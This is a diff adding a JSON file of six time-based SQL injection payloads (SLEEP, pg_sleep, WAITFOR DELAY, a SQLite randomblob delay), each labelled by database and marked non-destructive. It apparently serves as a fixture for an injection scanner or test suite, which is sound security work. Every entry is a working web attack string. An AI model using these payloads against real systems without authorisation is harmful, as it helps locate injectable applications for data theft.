@@ -1,0 +1,62 @@
+[
+  {
+    "name": "time_sqli_mysql_sleep",
+    "value": "' OR (SELECT 1 FROM (SELECT SLEEP(2))x)-- ",
+    "kind": "time_delay",
+    "dbms": "mysql",
+    "delay_seconds": 2,
+    "destructive": false,
+    "source": "PayloadsAllTheThings",
+    "upstream_reference": "SQL Injection/Time-based.md"
+  },
+  {
+    "name": "time_sqli_mysql_sleep_numeric",
+    "value": "1 AND (SELECT 1 FROM (SELECT SLEEP(2))x)",
+    "kind": "time_delay",
+    "dbms": "mysql",
+    "delay_seconds": 2,
+    "destructive": false,
+    "source": "PayloadsAllTheThings",
+    "upstream_reference": "SQL Injection/Time-based.md"
+  },
+  {
+    "name": "time_sqli_postgres_sleep",
+    "value": "' OR pg_sleep(2)-- ",
+    "kind": "time_delay",
+    "dbms": "postgresql",
+    "delay_seconds": 2,
+    "destructive": false,
+    "source": "PayloadsAllTheThings",
+    "upstream_reference": "SQL Injection/Time-based.md"
+  },
+  {
+    "name": "time_sqli_postgres_sleep_numeric",
+    "value": "1 AND (SELECT 1 FROM pg_sleep(2))",
+    "kind": "time_delay",
+    "dbms": "postgresql",
+    "delay_seconds": 2,
+    "destructive": false,
+    "source": "PayloadsAllTheThings",
+    "upstream_reference": "SQL Injection/Time-based.md"
+  },
+  {
+    "name": "time_sqli_mssql_waitfor",
+    "value": "'; WAITFOR DELAY '0:0:2'-- ",
+    "kind": "time_delay",
+    "dbms": "mssql",
+    "delay_seconds": 2,
+    "destructive": false,
+    "source": "PayloadsAllTheThings",
+    "upstream_reference": "SQL Injection/Time-based.md"
+  },
+  {
+    "name": "time_sqli_sqlite_randomblob",
+    "value": "' AND (SELECT 1 FROM (SELECT COUNT(*) FROM rtreecheck(randomblob(50000000))))-- ",
+    "kind": "time_delay",
+    "dbms": "sqlite",
+    "delay_seconds": 2,
+    "destructive": false,
+    "source": "PayloadsAllTheThings",
+    "upstream_reference": "SQL Injection/Time-based.md"
+  }
+]
